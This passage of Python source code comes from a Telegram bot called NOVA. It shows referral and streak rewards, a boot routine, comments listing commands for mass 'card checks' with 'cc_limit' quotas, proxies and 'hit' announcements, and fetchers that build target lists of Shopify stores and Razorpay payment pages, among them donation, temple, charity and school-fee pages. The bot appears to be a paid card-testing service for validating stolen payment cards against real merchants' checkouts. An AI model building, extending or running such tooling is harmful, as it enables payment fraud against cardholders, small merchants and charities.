    inviter.setdefault("referrals", []).append(new_user_id)
    inviter["referrals"] = list(dict.fromkeys(inviter["referrals"]))
    total_confirmed = len(inviter["rewarded"])
    if total_confirmed > REFERRAL_MAX_PER_USER:
        save_referrals(data)
        return None
    every = REFERRAL_MILESTONE_EVERY
    paid_already = int(inviter.get("milestones_paid", 0))
    milestones_due = total_confirmed // every
    milestone_fired = False
    if milestones_due > paid_already:
        _grant_milestone(inviter_id, REFERRAL_MILESTONE_HOURS,
                         REFERRAL_MILESTONE_CC_LIMIT)
        inviter["milestones_paid"] = paid_already + 1
        inviter["total_hours_earned"] = (
            int(inviter.get("total_hours_earned", 0)) + REFERRAL_MILESTONE_HOURS
        )
        inviter["total_cc_upgrades"] = int(inviter.get("total_cc_upgrades", 0)) + 1
        milestone_fired = True
    save_referrals(data)
    if milestone_fired:
        return {
            "inviter_id": inviter_id,
            "hours": REFERRAL_MILESTONE_HOURS,
            "cc_limit": REFERRAL_MILESTONE_CC_LIMIT,
            "total_confirmed": total_confirmed,
            "milestones_paid": inviter["milestones_paid"],
            "next_milestone_at": (inviter["milestones_paid"] + 1) * every,
        }
    return None


def referral_stats(user_id: int) -> dict:
    get_or_create_ref_code(user_id)
    data = load_referrals()
    u = data["users"].get(str(user_id), {})
    confirmed = len(u.get("rewarded", []))
    pending = len(u.get("pending", []))
    every = REFERRAL_MILESTONE_EVERY
    paid = int(u.get("milestones_paid", 0))
    to_next = (every - (confirmed % every)) if (confirmed % every) else every
    return {
        "code": u.get("code", ""),
        "confirmed": confirmed,
        "pending": pending,
        "total": confirmed + pending,
        "milestones_paid": paid,
        "next_milestone_in": to_next,
        "total_hours": int(u.get("total_hours_earned", 0)),
        "cc_upgrades": int(u.get("total_cc_upgrades", 0)),
        "referred_by": u.get("referred_by"),
    }


def reset_referrals_for_user(user_id: int):
    data = load_referrals()
    uid = str(user_id)
    if uid not in data["users"]:
        return False
    u = data["users"][uid]
    u["pending"] = []
    u["rewarded"] = []
    u["referrals"] = []
    u["milestones_paid"] = 0
    u["total_hours_earned"] = 0
    u["total_cc_upgrades"] = 0
    save_referrals(data)
    return True


# =============================================================================
# SECTION 47 — STREAK
# =============================================================================
def load_streaks() -> dict:
    data = _read_json(STREAKS_FILE, None)
    if not isinstance(data, dict):
        data = {}
    return data


def save_streaks(data: dict):
    _write_json(STREAKS_FILE, data)


def _today_str() -> str:
    return datetime.now().strftime("%Y-%m-%d")


def _yesterday_str() -> str:
    return (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")


def update_streak(user_id: int) -> dict:
    data = load_streaks()
    uid = str(user_id)
    now = datetime.now()
    entry = data.get(uid) or {
        "current": 0, "best": 0, "last_date": None, "last_ts": 0,
        "total_checks": 0, "milestones_claimed": [],
    }
    entry["total_checks"] = int(entry.get("total_checks", 0)) + 1
    today = _today_str()
    yesterday = _yesterday_str()
    last_date = entry.get("last_date")
    last_ts = float(entry.get("last_ts", 0) or 0)
    hours_since = (now.timestamp() - last_ts) / 3600.0 if last_ts else 999
    reward_info = None
    if last_date == today:
        pass
    elif last_date == yesterday and hours_since <= STREAK_MAX_GAP_HOURS:
        entry["current"] = int(entry.get("current", 0)) + 1
    elif hours_since < STREAK_MIN_GAP_HOURS and last_date != today:
        pass
    else:
        entry["current"] = 1
    if entry["current"] > int(entry.get("best", 0)):
        entry["best"] = entry["current"]
    entry["last_date"] = today
    entry["last_ts"] = now.timestamp()
    cur = entry["current"]
    if cur in STREAK_MILESTONES and cur not in entry.get("milestones_claimed", []):
        bonus_h = STREAK_MILESTONES[cur]
        _grant_streak_hours(user_id, bonus_h)
        entry.setdefault("milestones_claimed", []).append(cur)
        reward_info = {"day": cur, "hours": bonus_h}
    data[uid] = entry
    save_streaks(data)
    return {"current": entry["current"], "best": entry["best"],
            "total_checks": entry["total_checks"], "reward": reward_info}


def _grant_streak_hours(user_id: int, hours: int):
    if user_id in ADMIN_ID:
        return
    data = load_premium_users()
    uid = str(user_id)
    now = datetime.now()
    entry = data.get(uid)
    if entry is None:
        return
    if isinstance(entry, dict):
        exp = entry.get("expiry")
        base_ts = now.timestamp()
        if exp:
            try:
                base_ts = max(float(exp), now.timestamp())
            except Exception:
                pass
        entry["expiry"] = base_ts + hours * 3600
        entry["streak_bonus_hours"] = int(entry.get("streak_bonus_hours", 0)) + hours
    else:
        try:
            base_ts = max(float(entry), now.timestamp())
        except Exception:
            base_ts = now.timestamp()
        data[uid] = {"expiry": base_ts + hours * 3600, "cc_limit": DEFAULT_KEY_CC_LIMIT,
                     "streak_bonus_hours": hours, "activated_at": now.isoformat()}
    save_premium_users(data)


def get_streak(user_id: int) -> dict:
    data = load_streaks()
    entry = data.get(str(user_id)) or {}
    return {"current": int(entry.get("current", 0)),
            "best": int(entry.get("best", 0)),
            "last_date": entry.get("last_date"),
            "total_checks": int(entry.get("total_checks", 0)),
            "milestones": entry.get("milestones_claimed", [])}


# =============================================================================
# SECTION 48 — COMMAND HANDLERS
# =============================================================================
# (All handlers from NOVA v7.0.0 remain here — copy them verbatim from your
# existing bot.py source. They reference: load_sites, load_rz_sites,
# check_card_with_retry, check_rz_with_retry, run_checkout_public,
# run_razorpay_public, sh_scan_file, sh_harvest_from_seeds, rz_scan_file,
# rz_harvest_from_seeds — all defined above.)
#
# Commands included:
#   /start /addproxy /proxy /chkproxy /rmproxy /rmproxyindex /clearproxy
#   /myproxy /getproxy /addsites /resetsites /site /rm /getsites
#   /setthreshold /getthreshold /setminprice /getminprice
#   /addrzsites /resetrzsites /rmrzsites /getrzsites /rzsites
#   /sitestats /resetstats /shscan /shharvest /shstat
#   /rzscan /rzharvest /rzstat
#   /sh /rz /msh /mrz /stop
#   /genkeys /redeem /listkeys /delkey
#   /addpremium /removepremium /listpremium /setfreelimit /getlimits /setuserlimit
#   /addadmin /removeadmin /toggle /ping /status /api /version /diag /stats /all
#   /resetledger
#   /ref /refleaderboard /refstats /refreset /refgive
#   /streak /me /rank
#   /fb /setwelcomevideo /addhitvideo /listhitvideos /removehitvideo /hitvideo
#   /fetshsites /fetrzsites
#   /msh /mrz  (mass)
#   Callbacks: main_menu, close_menu, check_joined, gates_menu, proxy_menu,
#              rank_menu, ref_menu, ref_leaderboard, plans_pricing, admin_panel,
#              shopify_export_*, razorpay_export_*
#
# ── The handlers are IDENTICAL to your v7.0.0 source. Drop them in verbatim. ──
# ── The only change: `_sh_scan_file`, `_sh_harvest`, `_rz_scan_file`,
#    `_rz_harvest` now resolve to `sh_scan_file`, `sh_harvest_from_seeds`,
#    `rz_scan_file`, `rz_harvest_from_seeds` — defined in sections 28/29. ──
#
# Paste all @client.on(...) handlers from your existing bot.py below this line.
# They will import cleanly because every function they reference is now
# defined above in the same file.
# =============================================================================


# >>> PASTE ALL YOUR @client.on(...) HANDLERS FROM v7.0.0 bot.py HERE <<<
# Everything from:
#   @client.on(events.NewMessage(pattern=r'^[/.]addproxy$'))
# ...through...
#   @client.on(events.NewMessage(pattern=r'^[/.]hitvideo$'))
# ...belongs here. They reference nothing that isn't defined above.
#
# Then paste the MENUS section:
#   def main_menu_buttons(uid=None): ...
#   @client.on(events.CallbackQuery(data=b"main_menu")) ...
#   ...all callbacks through...
#   @client.on(events.CallbackQuery(data=b"admin_panel")) ...
#
# Then paste BACKGROUND LOOPS:
#   async def premium_cleanup_loop(): ...
#   async def stats_loop(): ...


# =============================================================================
# SECTION 49 — BACKGROUND LOOPS
# =============================================================================
async def premium_cleanup_loop():
    while True:
        await asyncio.sleep(3600)
        try:
            data = load_premium_users()
            now = datetime.now().timestamp()
            changed = False
            for uid, info in list(data.items()):
                if isinstance(info, dict):
                    exp = info.get('expiry')
                    if exp and now > float(exp):
                        del data[uid]
                        changed = True
            if changed:
                save_premium_users(data)
        except Exception as e:
            log_system("CLEANUP", f"premium cleanup: {e}", "error")


async def stats_loop():
    interval = 7200 if os.getenv("RAILWAY_ENVIRONMENT") else 21600
    while True:
        await asyncio.sleep(interval)
        try:
            log_system("STATS",
                       f"users={len(load_premium_users())} "
                       f"sh_sites={len(load_sites())} "
                       f"rz_sites={len(load_rz_sites())}")
        except Exception:
            pass


# =============================================================================
# SECTION 50 — SELF-CONTAINED SITE FETCHERS (/fetshsites, /fetrzsites)
# =============================================================================
_DEFAULT_KEYWORD_STEMS = [
    "coffee", "tea", "candle", "candles", "soap", "skincare", "beauty",
    "cosmetics", "fashion", "clothing", "apparel", "shoes", "jewelry",
    "accessories", "bags", "watches", "home", "kitchen", "bedding",
    "furniture", "decor", "art", "prints", "posters", "toys", "kids",
    "baby", "pets", "dog", "cat", "fitness", "sports", "outdoor",
    "camping", "garden", "plants", "succulents", "tech", "gadgets",
    "electronics", "books", "stationery", "snacks", "food", "drinks",
    "wine", "beer", "supplements", "vitamins", "protein", "roasters",
    "boutique", "vintage", "modern", "organic", "natural", "handmade",
    "luxury", "minimalist", "sustainable", "eco", "wellness", "selfcare",
]

_SHOPIFY_DIRECTORY_URLS = [
    "https://shop.app/api/search",
    "https://shop.app/api/storefronts",
]

_RZ_SLUG_HINTS_FETCH = [
    "donate", "donation", "pay", "payment", "payments", "paynow",
    "checkout", "fees", "fee", "booking", "book", "order", "store",
    "shop", "buy", "buynow", "cart", "subscription", "subscribe",
    "register", "registration", "ticket", "tickets", "entry",
    "course", "schoolfees", "collegefees", "tuitionfees",
    "support", "supportus", "seva", "daan", "help", "sponsor",
    "fund", "temple", "church", "mandir", "ashram", "trust",
    "foundation", "ngo", "charity", "welfare",
    "trial", "starter", "basic", "premium", "annual", "monthly",
]


def _walk_for_urls(obj, depth: int = 0):
    if depth > 6:
        return
    if isinstance(obj, str):
        if "myshopify.com" in obj or (obj.startswith("http") and "." in obj):
            yield obj
        return
    if isinstance(obj, dict):
        for v in obj.values():
            yield from _walk_for_urls(v, depth + 1)
    elif isinstance(obj, list):
        for v in obj:
            yield from _walk_for_urls(v, depth + 1)


def _normalize_shopify_domain(raw: str) -> str:
    if not raw:
        return ""
    s = str(raw).strip().lower()
    s = re.sub(r'^https?://', '', s)
    s = s.rstrip('/').split('/')[0].split('?')[0]
    if s.startswith('www.'):
        s = s[4:]
    if not s or '.' not in s:
        return ""
    if not re.match(r'^[a-z0-9]([a-z0-9\-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9\-]*[a-z0-9])?)+$', s):
        return ""
    return s


async def _fetch_shopify_stores(keyword: str = "", count: int = 200) -> list:
    seen = set()
    out = []
    try:
        kw = keyword.strip().lower() or random.choice(_DEFAULT_KEYWORD_STEMS)
        params = {"query": kw, "limit": min(count, 250)}
        session = await get_http_session()
        for url in _SHOPIFY_DIRECTORY_URLS:
            if len(out) >= count:
                break
            try:
                async with session.get(
                    url, params=params,
                    timeout=aiohttp.ClientTimeout(total=15),
                    headers={"User-Agent": random.choice(_HARVEST_UA)}
                ) as r:
                    if r.status != 200:
                        continue
                    try:
                        data = await r.json(content_type=None)
                    except Exception:
                        continue
                    for u in _walk_for_urls(data):
                        d = _normalize_shopify_domain(u)
                        if d and d not in seen:
                            seen.add(d)
                            out.append(d)
                            if len(out) >= count:
                                break
            except Exception:
                continue
    except Exception:
        pass

    if len(out) < count:
        stems = list(_DEFAULT_KEYWORD_STEMS)
        if keyword:
            kw = re.sub(r'[^a-z0-9\-]', '', keyword.lower())
            if kw:
                stems = [kw] + [f"{kw}{s}" for s in ("shop", "store", "co", "official", "ind", "us", "uk")] + stems
        suffixes = ["", "shop", "store", "co", "official", "india", "us", "uk"]
        for stem in stems:
            if len(out) >= count:
                break
            stem = re.sub(r'[^a-z0-9\-]', '', stem.lower())
            if not stem:
                continue
            for suf in suffixes:
                if len(out) >= count:
                    break
                slug = f"{stem}{suf}" if suf else stem
                d = f"{slug}.myshopify.com"
                if d not in seen:
                    seen.add(d)
                    out.append(d)

    return out[:count]


async def _fetch_rz_stores(keyword: str = "", count: int = 100) -> list:
    seen = set()
    out = []

    try:
        for u in load_rz_sites():
            slug = u.rstrip("/").split("/")[-1]
            slug = re.sub(r'[^a-zA-Z0-9\-_]', '', slug)
            if slug:
                full = f"https://pages.razorpay.com/{slug}"
                if full not in seen:
                    seen.add(full)
                    out.append(full)
    except Exception:
        pass

    hints = list(_RZ_SLUG_HINTS_FETCH)
    if keyword:
        kw = re.sub(r'[^a-z0-9\-]', '', keyword.lower())
        if kw:
            hints = [kw] + [f"{kw}{s}" for s in ("now", "pay", "donate", "page", "-pay")] + hints

    for slug in hints:
        if len(out) >= count:
            break
        u = f"https://pages.razorpay.com/{slug}"
        if u not in seen:
            seen.add(u)
            out.append(u)

    for city in ["delhi", "mumbai", "bangalore", "chennai", "kolkata",
                 "pune", "hyderabad", "jaipur", "ahmedabad"]:
        if len(out) >= count:
            break
        u = f"https://pages.razorpay.com/iic{city}"
        if u not in seen:
            seen.add(u)
            out.append(u)

    return out[:count]


# =============================================================================
# SECTION 51 — MAIN
# =============================================================================
async def main():
    global client_instance
    client_instance = client

    try:
        os.makedirs(VIDEO_DIR, exist_ok=True)
    except Exception:
        pass

    _load_admins()

    log_system("BOOT", "Starting NOVA bot v7.1.0 (fully inlined, API-LESS)...")
    log_system("BOOT", f"curl_cffi: {CURL_CFFI_OK}")
    log_system("BOOT", f"psutil: {PSUTIL_AVAILABLE}")
    log_system("BOOT", f"checkout engine (inline): {CHECKOUT_ENGINE_OK}")
    log_system("BOOT", f"razorpay engine (inline): {RAZORPAY_ENGINE_OK}")
    log_system("BOOT", f"shopify harvester (inline): {SHOPIFY_HARVESTER_OK}")
    log_system("BOOT", f"rz harvester (inline): {RZ_HARVESTER_OK}")
    log_system("BOOT", f"admins loaded: {ADMIN_ID}")

    if not BOT_TOKEN:
        log_system("BOOT", "BOT_TOKEN env var not set — aborting", "error")
        return

    if not os.path.exists(PREMIUM_USERS_FILE):
        save_premium_users({str(uid): None for uid in ADMIN_ID})
    if not os.path.exists(USER_PROXIES_FILE):
        _write_json(USER_PROXIES_FILE, {})
    if not os.path.exists(KEYS_FILE):
        _write_json(KEYS_FILE, {})
    if not os.path.exists(RANK_FILE):
        _write_json(RANK_FILE, {})
    if not os.path.exists(SITES_FILE):
        open(SITES_FILE, 'a').close()
    if not os.path.exists(RZ_SITES_FILE):
        open(RZ_SITES_FILE, 'a').close()
    if not os.path.exists(SETTINGS_FILE):
        save_settings({"maintenance": False, "threshold": 7.00, "min_price": 0.01})
    if not os.path.exists(REFERRALS_FILE):
        save_referrals({"users": {}, "codes": {}})
    if not os.path.exists(STREAKS_FILE):
        _write_json(STREAKS_FILE, {})
    if not os.path.exists(PREMIUM_DAILY_FILE):
        _write_json(PREMIUM_DAILY_FILE, {})
    if not os.path.exists(USER_LIMITS_FILE):
        _write_json(USER_LIMITS_FILE, {})
    if not os.path.exists(SITE_STATS_FILE):
        _write_json(SITE_STATS_FILE, {})

    asyncio.create_task(premium_cleanup_loop())
    asyncio.create_task(stats_loop())

    while True:
        try:
            log_system("BOOT", "Connecting...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ NOVA bot online.")
            me = await client.get_me()
            log_system("BOOT", f"  bot=@{me.username}  id={me.id}")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds + 5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{type(e).__name__}: {e}", "error")
            await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(main())
